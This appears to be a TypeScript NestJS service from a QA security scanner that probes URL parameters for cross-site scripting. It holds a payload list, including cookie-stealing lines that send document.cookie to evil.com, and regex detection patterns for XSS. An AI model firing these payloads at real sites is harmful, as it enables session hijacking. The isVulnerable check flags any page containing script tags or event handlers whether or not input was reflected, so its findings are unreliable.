import { Injectable, Logger } from '@nestjs/common';
import { VulnerabilityResult, TargetResult } from './scanner.service';

const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "'-alert('XSS')-'",
  '<iframe src="javascript:alert("XSS")>',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onmouseover=alert("XSS")>',
  '<a href="javascript:alert(\'XSS\')">click</a>',
  '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
  '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
  '<img src="x" onerror="new Image().src=\'http://evil.com/?c=\'+document.cookie">',
  '<link rel="import" href="http://evil.com/xss.html">',
];

const XSS_REFLECTED_PATTERNS = [
  /<script[^>]*>.*?<\/script>/gi,
  /on\w+\s*=/gi,
  /javascript:/gi,
  /<img[^>]*onerror/gi,
  /<svg[^>]*onload/gi,
];

@Injectable()
export class XssScanner {
  private readonly logger = new Logger(XssScanner.name);

  async scan(
    _scanId: string,
    baseUrl: string,
    config: Record<string, unknown>,
  ): Promise<{ vulnerabilities: VulnerabilityResult[]; targets: TargetResult[] }> {
    const vulnerabilities: VulnerabilityResult[] = [];
    const targets: TargetResult[] = [];

    const testParams = ['q', 'search', 'query', 'id', 'name', 'email', 'msg', 'comment', 's', 'term'];
    const testValues = ['test', '1', 'admin', 'admin@example.com', 'hello world'];

    for (const param of testParams) {
      for (const value of testValues) {
        const testUrl = `${baseUrl}?${param}=${encodeURIComponent(value)}`;
        const response = await this.fetchWithTimeout(testUrl);

        if (response) {
          targets.push({
            url: testUrl,
            method: 'GET',
            status: response.status,
            responseTime: response.responseTime,
            isSecure: true,
          });

          if (this.isVulnerable(response.body, value)) {
            vulnerabilities.push({
              title: 'Cross-Site Scripting (XSS)',
              description: `Reflected XSS vulnerability detected in parameter "${param}"`,
              severity: 'HIGH',
              status: 'OPEN',
              cweId: 'CWE-79',
              owaspCategory: 'A03_INJECTION',
              affectedUrl: testUrl,
              affectedParam: param,
              evidence: { reflectedValue: value },
              remediation: 'Implement output encoding, use Content Security Policy, validate and sanitize user input.',
              remediationUrl: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
            });
          }
        }
      }
    }

    for (const payload of XSS_PAYLOADS.slice(0, 5)) {
      const testUrl = `${baseUrl}?q=${encodeURIComponent(payload)}`;
      const response = await this.fetchWithTimeout(testUrl);

      if (response && this.isVulnerable(response.body, payload)) {
        vulnerabilities.push({
          title: 'Cross-Site Scripting (XSS)',
          description: `Stored/Reflected XSS payload executed`,
          severity: 'CRITICAL',
          status: 'OPEN',
          cweId: 'CWE-79',
          owaspCategory: 'A03_INJECTION',
          affectedUrl: testUrl,
          affectedParam: 'q',
          evidence: { payload: payload.substring(0, 100) },
          remediation: 'Use context-sensitive output encoding, implement CSP headers, sanitize HTML input.',
        });
      }
    }

    return { vulnerabilities, targets };
  }

  private async fetchWithTimeout(url: string): Promise<{ status: number; body: string; responseTime: number } | null> {
    const start = Date.now();
    try {
      const response = await fetch(url, {
        method: 'GET',
        headers: { 'User-Agent': 'QADash-SecurityScanner/1.0' },
        signal: AbortSignal.timeout(5000),
      });

      const body = await response.text();
      return {
        status: response.status,
        body,
        responseTime: Date.now() - start,
      };
    } catch {
      return null;
    }
  }

  private isVulnerable(body: string, input: string): boolean {
    const inputLower = input.toLowerCase();

    for (const pattern of XSS_REFLECTED_PATTERNS) {
      if (pattern.test(body)) {
        return true;
      }
    }

    const unescapedInput = input
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"')
      .replace(/&amp;/g, '&');

    if (body.includes(input) || body.includes(unescapedInput)) {
      for (const pattern of XSS_REFLECTED_PATTERNS) {
        const matches = body.match(new RegExp(`<[^>]*${pattern.source}`, 'gi'));
        if (matches && matches.length > 0) {
          return true;
        }
      }
    }

    return false;
  }
}